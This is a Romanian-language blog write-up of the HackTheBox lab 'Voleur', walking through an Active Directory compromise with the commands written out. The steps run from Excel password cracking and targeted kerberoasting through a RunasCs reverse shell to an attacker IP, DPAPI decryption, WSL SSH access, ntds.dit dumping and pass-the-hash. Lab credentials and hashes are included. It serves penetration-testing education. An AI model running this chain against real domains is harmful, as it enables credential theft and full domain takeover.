---
layout: post
title: "HTB Voleur — Write-up complet"
date: 2026-07-18
categories: [htb, active-directory]
tags: [kerberos, dpapi, kerberoasting, wsl]
---
**Target:** `10.129.232.130` (DC.voleur.htb) **Domeniu:** `voleur.htb` **Dificultate:** Medium (Active Directory)

Voleur e genul de cutie care te învață un lucru important despre AD: **atacul rareori vine dintr-o singură vulnerabilitate mare**. Aici avem un lanț lung de credențiale mici, fiecare deblocând-o pe următoarea, ca o serie de chei care se deschid una pe alta. Hai să trecem prin tot lanțul, pas cu pas.

---

## 1. Recon inițial

Primul pas, ca întotdeauna: un scan complet de porturi cu detectare de versiuni și scripturi default.

```bash
sudo nmap -sCV -vv -oA nmap/voleur 10.129.232.130
```

### Ce găsim

|Port|Serviciu|Observații|
|---|---|---|
|53|DNS|Simple DNS Plus — clasic pentru un DC|
|88|Kerberos|Confirmă rolul de Domain Controller|
|135|MSRPC|—|
|139 / 445|NetBIOS / SMB|Vectorul principal de enumerare|
|389 / 3268|LDAP / Global Catalog|Domain: `voleur.htb`|
|464|kpasswd5|Schimbare parole Kerberos|
|593|RPC over HTTP|—|
|636 / 3269|LDAPS / GC SSL|—|
|**2222**|**SSH (OpenSSH 8.2, Ubuntu)**|Neobișnuit pe un DC Windows — semn că undeva în infrastructură există și o componentă Linux. De reținut pentru mai târziu.|
|5985|WinRM|Va deveni vectorul nostru de shell|

Două detalii din scan care contează enorm mai târziu:

- **Clock skew de ~8 ore.** Kerberos e paranoic în privința timpului — toleranța implicită e de doar 5 minute. Dacă ceasul tău local diferă prea mult față de DC, orice autentificare Kerberos moare cu `KRB_AP_ERR_SKEW`, indiferent cât de corecte sunt credențialele.
- **SMB signing enabled and required.** Asta ne taie din start orice idee de NTLM relay clasic. Practic, mesajul e: "aici lucrezi curat, cu Kerberos, sau nu lucrezi deloc".

> **Analogie:** gândește-te la Kerberos ca la un bilet de concert cu oră de expirare tipărită pe el. Dacă ceasul tău arată o oră greșită, portarul (KDC-ul) se uită la bilet, vede că "expiră în trecut" sau "e emis în viitor" și te refuză — chiar dacă biletul e 100% autentic.

---

## 2. Pregătirea mediului Kerberos

### 2.1 Generarea `krb5.conf`

NetExec poate genera automat fișierul de configurare Kerberos, pe baza informațiilor pe care le identifică prin SMB:

```bash
nxc smb DC.voleur.htb --generate-krb5-file voleur.htb
sudo cp voleur.htb /etc/krb5.conf
```

Fără acest fișier corect (realm, KDC, domain mapping), autentificarea Kerberos de pe mașina de atac eșuează garantat, chiar dacă parola e corectă.

### 2.2 Sincronizarea ceasului

```bash
sudo ntpdate 10.129.232.130
```

**Regula de aur:** sincronizezi ceasul _înainte_ de orice autentificare Kerberos. E, probabil, cea mai frecventă cauză de eșec în laboratoare AD — oamenii au parola corectă, dar Kerberos refuză oricum din cauza timpului.

---

## 3. Validarea credențialelor inițiale

Pornim cu un set de credențiale valide: `ryan.naylor` / `HollowOct31Nyt`.

```bash
nxc smb DC.voleur.htb -u ryan.naylor -p 'HollowOct31Nyt' -k
```

Rezultatul confirmă `signing:True`, `SMBv1:None`, `NTLM:False` — mediu strict, dar autentificarea Kerberos (`-k`) merge fără probleme.

---

## 4. Enumerarea share-urilor SMB

```bash
nxc smb DC.voleur.htb -u ryan.naylor -p 'HollowOct31Nyt' -k --shares
```

|Share|Acces (ryan.naylor)|Observații|
|---|---|---|
|ADMIN$ / C$|—|Standard|
|Finance / HR|fără acces|De revizitat cu alte credențiale|
|IPC$|READ|Standard|
|**IT**|**READ**| Punctul nostru de plecare|
|NETLOGON / SYSVOL|READ|Standard|

> **Lecție de metodologie:** orice acces READ pe un share cu nume "de business" (aici `IT`) e primul loc unde te uiți după fișiere de configurare, documente interne sau — jackpot — Excel-uri cu parole "temporare".

---

## 5. Colectare BloodHound

Colectăm datele de graf AD cât mai devreme posibil, imediat ce avem orice cont valid:

```bash
bloodhound-python -u 'ryan.naylor' -d 'voleur.htb' -p 'HollowOct31Nyt' -c all --zip -ns 10.129.232.130 --dns-tcp
sudo neo4j console
```

Apoi deschidem BloodHound și importăm arhiva.

> **De ce contează:** BloodHound nu-ți dă exploit-uri, îți dă _harta_. Relații ACL, membership-uri de grup, sesiuni active, delegări — toate lucrurile pe care le-ai descoperi oricum manual, dar mult mai încet. Aici, de exemplu, ne arată că `ryan.naylor` are Kerberos Pre-Authentication dezactivat — ușa larg deschisă pentru un **AS-REP Roasting**.

---

## 6. Explorarea share-ului IT

```bash
smbclient --realm=voleur.htb -U 'voleur.htb/ryan.naylor%HollowOct31Nyt' //DC.voleur.htb/IT
```

În folderul `First-Line Support` găsim:

```
smb: \First-Line Support\> ls
  Access_Review.xlsx    A    16896   Thu Jan 30 09:14:25 2025

smb: \First-Line Support\> get Access_Review.xlsx
```

> **Lecție de metodologie:** fișierele Excel cu nume generice ("Access Review", "Onboarding", "Passwords") sunt ținte de aur în share-uri IT. Companiile țin liste de conturi/parole "doar temporar, câteva zile" — care rămân acolo luni întregi.

---

## 7. Spargerea parolei Excel-ului

Fișierul e protejat cu parolă. Extragem hash-ul compatibil John the Ripper:

```bash
office2john Access_Review.xlsx > hash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

**Rezultat:** parola cade aproape instant — `football1`.

> **De ce a mers atât de repede:** Office 2013 folosește SHA1/SHA512 cu 100.000 de iterații, ceea ce înseamnă un cost computațional decent per încercare. Dar protecția criptografică e la fel de puternică precum parola aleasă de utilizator — și `football1` e exact genul de parolă care stă pe primele rânduri din rockyou.txt. Un vault elvețian cu o combinație de "1234" tot un vault slab rămâne.

---

## 8. Ce conține Excel-ul

conturi, grupuri și notițe operaționale.

|Cont|Grup / Rol|Notă|
|---|---|---|
|**ryan.naylor**|SMB| Kerberos Pre-Auth dezactivat temporar (testare sisteme legacy) → **AS-REP Roasting**|
|marie.bryant|SMB|—|
|lacey.miller|Remote Management Users|Acces WinRM|
|**todd.wolfe**|Remote Management Users|Cont de "leaver" — parolă resetată la `NightT1meP1dg3on14`, urma să fie șters|
|jeremy.combs|Remote Management Users|Acces pe folder-ul "Software"|
|Administrator|Domain Admin|"Nu de folosit pentru task-uri zilnice" — ținta finală|
|svc_backup|Windows Backup|"Vorbește cu Jeremy Combs"|
|**svc_ldap**|LDAP Services|Parolă expusă: `M1XyC9pW7qT5Vn`|
|**svc_iis**|IIS Administration|Parolă expusă: `N5pXyW1VqM7CZ8`|
|svc_winrm|Remote Management|Parolă resetată recent de Lacey Miller — nu apare direct|

Validăm imediat cele două parole expuse:

```bash
nxc smb DC.voleur.htb -u svc_ldap -p 'M1XyC9pW7qT5Vn' -k
nxc smb DC.voleur.htb -u svc_iis -p 'N5pXyW1VqM7CZ8' -k
```

Ambele funcționează.

---

## 9. De la `svc_ldap` la `svc_winrm`: kerberoasting țintit

În BloodHound observăm două lucruri esențiale:

1. `svc_ldap` este membru al grupului **Restore Member User** (relevant mai târziu, pentru contul lui Todd).
2. `svc_ldap` are drept de **WriteSPN** asupra contului `svc_winrm`, iar `svc_winrm` e membru al grupului **Remote Management Users** (adică are acces WinRM).

Asta e o combinație clasică de abuz: dacă poți scrie un Service Principal Name (SPN) pe un cont care altfel n-are unul, poți forța acel cont să devină "kerberoastable" — practic îi atârni un tag de "service" ca să poți cere un service ticket pentru el.

> **Analogie:** kerberoasting-ul normal funcționează pentru conturile de "service" (ex. un cont care rulează un website), pentru că oricine din domeniu poate cere un service ticket către acel serviciu — iar ticket-ul e criptat cu hash-ul parolei contului. Dacă un cont _nu_ are un SPN, nu poți cere acel ticket. WriteSPN e ca și cum ai putea lipi tu însuți un tag "Public Service" pe ușa biroului unui coleg, chiar dacă el nu lucrează la ghișeu — și dintr-o dată oricine poate cere un ticket către el, pe care îl poți ataca offline.

Adăugăm un SPN fals pe `svc_winrm`, folosindu-ne de dreptul `svc_ldap`:

```bash
bloodyad -d voleur.htb --host dc.voleur.htb -u svc_ldap -p 'M1XyC9pW7qT5Vn' -k \
  set object svc_winrm servicePrincipalName -v 'HTTP/CeAvemNoiAici'
```

Acum cerem service ticket-ul (kerberoasting) pentru `svc_winrm`:

```bash
nxc ldap DC.voleur.htb -u svc_ldap -p 'M1XyC9pW7qT5Vn' --kerberoast - -k
```

Primim un hash de tip `$krb5tgs$23$...` — un TGS ticket criptat cu hash-ul NTLM al parolei `svc_winrm`. Îl salvăm și îl atacăm offline cu hashcat:

```bash
hashcat -m 13100 -a 0 krbt_hash /usr/share/wordlists/rockyou.txt
```

**Parolă găsită:** `AFireInsidedeOzarctica980219afi`

Confirmăm:

```bash
nxc ldap DC.voleur.htb -u svc_winrm -p 'AFireInsidedeOzarctica980219afi' -k
```

---

## 10. Acces WinRM ca `svc_winrm`

Am spart parola prin kerberoasting, deci rămânem în ecosistemul Kerberos: în loc să ne autentificăm direct cu user + parolă (NTLM), obținem un TGT curat pentru cont și îl folosim direct, fără să mai vehiculăm parola prin rețea la fiecare conexiune.

```bash
getTGT.py 'voleur.htb/svc_winrm:AFireInsidedeOzarctica980219afi'
```

`getTGT.py` (din Impacket) face pasul pe care în mod normal l-ar face `kinit`: cere la KDC (DC-ul) un **Ticket Granting Ticket (TGT)** pentru `svc_winrm`, folosind user + parolă o singură dată.

> **Analogie:** gândește-te la KDC ca la ghișeul unui parc de distracții. Arăți buletinul (user + parolă) o singură dată la intrare și primești o **brățară de acces general** (TGT-ul), valabilă câteva ore. De aici încolo, la fiecare atracție (fiecare serviciu — SMB, LDAP, WinRM) nu mai arăți buletinul, arăți brățara, iar sistemul îți dă bilete specifice (TGS-uri) fără să te mai verifice de la zero.

Comanda salvează rezultatul într-un fișier `svc_winrm.ccache` — practic brățara salvată pe disc, în formatul standard de ticket cache Kerberos. Îl folosim cu `evil-winrm`:

```bash
KRB5CCNAME=svc_winrm.ccache evil-winrm -i dc.voleur.htb -r voleur.htb
```

`KRB5CCNAME` e o variabilă de mediu standard Kerberos care spune programului: *"când ai nevoie de tickete, nu le mai cere din nou — uită-te în fișierul ăsta"*. Astfel, `evil-winrm` citește TGT-ul din `svc_winrm.ccache`, cere automat un TGS pentru serviciul WinRM de pe `dc.voleur.htb`, iar autentificarea se face integral prin Kerberos — fără să mai transmitem parola încă o dată. Flag-ul `-r voleur.htb` indică realm-ul Kerberos necesar pentru cererea de TGS, iar `-i dc.voleur.htb` e adresa țintei.

Suntem înăuntru. **User flag găsit:**

```
*Evil-WinRM* PS C:\Users\svc_winrm\Desktop> cat user.txt
fxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxb0
```

---

## 11. Pivotare către `svc_ldap` cu RunasCs

Vrem să rulăm comenzi ca `svc_ldap` din contextul curent. Pregătim `RunasCs.exe` local:

```bash
sudo cp /opt/tools/SharpCollection/NetFramework_4.5_Any/_RunasCs.exe .
mv _RunasCs.exe runascs.exe
```

Deschidem un server HTTP local pentru a-l transfera pe target:

```bash
python3 -m http.server 8000
```

Din sesiunea evil-winrm, descărcăm binarul:

```powershell
wget http://10.10.15.43:8000/runascs.exe -o runascs.exe
```

Pornim un listener local:

```bash
nc -lnvp 9001
```

Suntem autentificați ca `svc_winrm`, dar drepturile care ne interesează în continuare sunt ale lui `svc_ldap` — membru în grupul **Restore Member User**, necesar mai jos pentru a recupera contul lui Todd. Simpla cunoaștere a parolei nu ajută dacă rulăm comenzi PowerShell sub tokenul lui `svc_winrm`: cmdlet-urile AD (`Get-ADObject`, `Restore-ADObject`) moștenesc permisiunile userului _curent din sesiune_, nu ale unui cont ale cărui credențiale doar le "știm". Trebuie deci să schimbăm efectiv identitatea procesului, nu doar să ne autentificăm remote ca `svc_ldap` prin LDAP.

Aici intervine `RunasCs.exe` — o alternativă open-source la `runas.exe` clasic, care funcționează perfect dintr-un shell non-interactiv (cum e reverse shell-ul nostru din evil-winrm). Folosește `CreateProcessWithLogonW` pentru a porni un proces nou, complet autentificat în domeniu ca alt user, spre deosebire de `runas.exe` standard, care are nevoie de un desktop interactiv și de multe ori face doar autentificare locală (`/netonly`), fără să obții un token de domeniu real.

Și rulăm comanda pentru un reverse shell ca `svc_ldap`:

```powershell
.\runascs.exe svc_ldap M1XyC9pW7qT5Vn powershell.exe -r 10.10.15.43:9001
```

Rezultatul e un `powershell.exe` nou, pornit cu credențialele lui `svc_ldap`, care se conectează înapoi la noi pe portul 9001 — un shell separat, în care orice comandă rulează cu drepturile reale ale lui `svc_ldap`.

---

## 12. Recuperarea contului șters al lui Todd Wolfe

Ne amintim din Excel: `todd.wolfe` era un cont de "leaver" — angajat plecat, cont marcat pentru ștergere, dar cu parolă resetată la `NightT1meP1dg3on14` înainte de asta. Fiindcă `svc_ldap` e membru al grupului **Restore Member User**, putem readuce contul din Recycle Bin-ul AD.

Căutăm obiectele șterse:

```powershell
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects
```

Găsim:

```
DistinguishedName : CN=Todd Wolfe\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted Objects,DC=voleur,DC=htb
Name              : Todd Wolfe
ObjectClass       : user
ObjectGUID        : 1c6b1deb-c372-4cbb-87b1-15031de169db
```

Îl restaurăm:

```powershell
Restore-ADObject -Identity 1c6b1deb-c372-4cbb-87b1-15031de169db
```

> **Analogie:** Active Directory nu șterge un obiect instant — îl mută într-un fel de Recycle Bin unde stă un timp înainte de ștergerea definitivă (tombstone lifetime). Dacă ai dreptul potrivit, poți scoate obiectul din Recycle Bin exact cum ai recupera un fișier șters accidental de pe desktop, atât timp cât nu ai golit Recycle Bin-ul.

Confirmăm că `todd.wolfe` / `NightT1meP1dg3on14` funcționează și refacem colectarea BloodHound cu noul context:

```bash
bloodhound-python -u 'todd.wolfe' -d 'voleur.htb' -p 'NightT1meP1dg3on14' -c all --zip -ns 10.129.232.130 --dns-tcp
```

---

## 13. Fișiere DPAPI — decriptarea vault-ului lui Todd

Verificăm share-urile accesibile ca Todd:

```bash
smbclient --realm=voleur.htb -U 'voleur.htb/todd.wolfe%NightT1meP1dg3on14' //DC.voleur.htb/IT
```

Apoi facem un spider complet peste toate share-urile pentru a găsi fișiere interesante:

```bash
nxc smb DC.voleur.htb -u todd.wolfe -p 'NightT1meP1dg3on14' -M spider_plus -k -o EXCLUDE_FILTER='print$,ipc$,SYSVOL,NETLOGON'
```

Găsim un folder DPAPI clasic în profilul arhivat al lui Todd:

```
smb: \Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\Protect\S-1-5-21-...-1110\> ls
 08949382-134f-4c63-b93c-ce52efc0aa88      A      740
 BK-VOLEUR                                AHS      900
 Preferred                                AHS       24
```

> **Analogie DPAPI:** gândește-te la DPAPI ca la un vault cu două chei diferite, care pot ambele să-l deschidă. Una e cheia utilizatorului — derivată din parola lui Windows. Cealaltă e o backup key a companiei (domain backup key), ținută de DC, pentru cazul în care utilizatorul își uită parola. Fișierul pe care tocmai l-am găsit e un masterkey — practic vault-ul în sine, criptat. Dacă avem parola utilizatorului, putem deschide vault-ul exact ca proprietarul legitim.

Decriptăm masterkey-ul folosind parola lui Todd:

```bash
impacket-dpapi masterkey \
  -file 08949382-134f-4c63-b93c-ce52efc0aa88 \
  -sid S-1-5-21-3927696377-1337352550-2781715495-1110 \
  -password NightT1meP1dg3on14
```

Obținem cheia decriptată. Cu ea, decriptăm un fișier de credențiale găsit în același loc:

```bash
impacket-dpapi credential -file DFBE70A7E5CC19A398EBF1B96859CE5D \
  -key 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
```

Acesta se dovedește a fi o credențială Windows Live, nu ne interesează. Dar mai găsim un al doilea fișier de credențiale în același folder, iar decriptarea lui e cea care contează:

```bash
impacket-dpapi credential -file 772275FAD58525253490A9B0039791D3 \
  -key 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
```

Rezultat — parola lui Jeremy Combs, salvată de Todd ca o credențială "de urgență":

```
Target      : Domain:target=Jezzas_Account
Username    : jeremy.combs
Unknown     : qT3V9pLXyN7W4m
```

---

## 14. `jeremy.combs` — cheia SSH și trecerea către Linux

Ne conectăm ca Jeremy și explorăm folder-ul lui dedicat:

```bash
smbclient --realm=voleur.htb -U 'voleur.htb/jeremy.combs%qT3V9pLXyN7W4m' //DC.voleur.htb/IT
```

```
smb: \Third-Line Support\> ls
 id_rsa                              A     2602
 Note.txt.txt                        A      186
```

Descărcăm `id_rsa`. Decodând conținutul (fișierul e stocat base64) aflăm cui aparține cheia: `svc_backup@DC`. Aici își face simțită prezența acel port SSH neobișnuit,  descoperit la recon (**2222**) — componenta Linux a mașinii.

---

## 15. Backup-uri AD prin SSH — jackpot-ul final

Ne conectăm prin SSH pe portul non-standard, folosind cheia privată găsită. Mai întâi îi dăm permisiunile corecte (SSH refuză chei private cu permisiuni prea permisive):

```bash
chmod 600 id_rsa
ssh -i id_rsa -p 2222 svc_backup@10.129.232.130
```

Suntem înăuntru. Aici se lămurește misterul portului 2222 de la recon: nu discutăm despre o mașină Linux separată, ci despre **WSL (Windows Subsystem for Linux)** rulând direct pe DC. Confirmăm rapid:

```bash
svc_backup@voleur:~$ uname -a
svc_backup@voleur:~$ ls /mnt/c
```

`/mnt/c` ne arată drive-ul `C:\` al Windows-ului montat direct în filesystem-ul Linux — semn clar de WSL.

> **Analogie:** gândește-te la WSL ca la o cameră de hotel din interiorul aceleiași clădiri (Windows-ul care găzduiește totul) — camera are propria ușă cu cod (portul 2222, SSH), propriile chei (utilizatori Linux separați de cei Windows). Dar există o particularitate: din cameră ai acces liber la un depozit comun al hotelului unde sunt stocate toate lucrurile celorlalți oaspeți (/mnt/c = discul C: al Windows-ului, cu tot ce conține el).
Practic, oricine obține cheia camerei (acces SSH la WSL) nu rămâne blocat doar acolo — poate ieși pe hol și umbla liber prin depozitul comun, adică prin tot sistemul Windows găzduit.

Cu acest acces, explorăm sistemul de fișiere Windows montat, căutând orice ar semăna cu un backup:

```bash
svc_backup@voleur:~$ find /mnt/c -iname "*backup*" 2>/dev/null
```

Găsim exact ce căutam:

```
/mnt/c/IT/Third-Line Support/Backups
```

Verificăm rapid conținutul:

```bash
svc_backup@voleur:~$ ls -la "/mnt/c/IT/Third-Line Support/Backups"
```

```
ntds.dit
ntds.jfm
SECURITY
SYSTEM
```

Numele fișierelor sunt un semnal clar: un backup complet al bazei de date Active Directory, exact ceea ce ne trebuie pentru pasul final. Descărcăm folderul întreg local:

```bash
scp -i id_rsa -P 2222 -r svc_backup@10.129.232.130:"/mnt/c/IT/Third-Line Support/Backups" .
```


> **Analogie:** `ntds.dit` este, practic, "cartea mare" a domeniului — conține hash-urile parolelor tuturor conturilor din AD. Fișierele `SYSTEM` și `SECURITY` sunt cheile care descuie acea carte (fără ele, hash-urile din ntds.dit sunt criptate și inutile). Dacă ai toate trei, ai efectiv acces la parolele/hash-urile fiecărui cont din domeniu — inclusiv Administrator.

Extragem totul cu `secretsdump`:

```bash
sudo impacket-secretsdump \
  -system "/home/vasilesco/Backups/registry/SYSTEM" \
  -security "/home/vasilesco/Backups/registry/SECURITY" \
  -ntds "/home/vasilesco/Backups/Active Directory/ntds.dit" \
  LOCAL
```

Printre rezultate, hash-ul NTLM al Administratorului:

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2:::
```

---

## 16. Domain Admin — Pass-the-Hash

Cu hash-ul NTLM al Administratorului nu avem nevoie de parola în clar. Folosim `psexec` cu Pass-the-Hash:

```bash
impacket-psexec -hashes :e656e07c56d831611b577b160b259ad2 -k "voleur.htb/administrator@dc.voleur.htb"
```

> **Analogie Pass-the-Hash:** dacă NTLM ar fi un lock cu combinație, hash-ul e echivalentul unei copii perfecte a cheii — nu ai nevoie de combinația originală (parola în clar), pentru că lock-ul acceptă orice obiect care se potrivește exact în formă cu cheia lui. Protocolul NTLM verifică hash-ul, nu parola în sine, deci o copie a hash-ului deschide ușa la fel de bine ca originalul.

Shell obținut ca `NT AUTHORITY\SYSTEM` pe DC. **Root flag:**

```
C:\Users\Administrator\Desktop> type root.txt
2xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx0
```
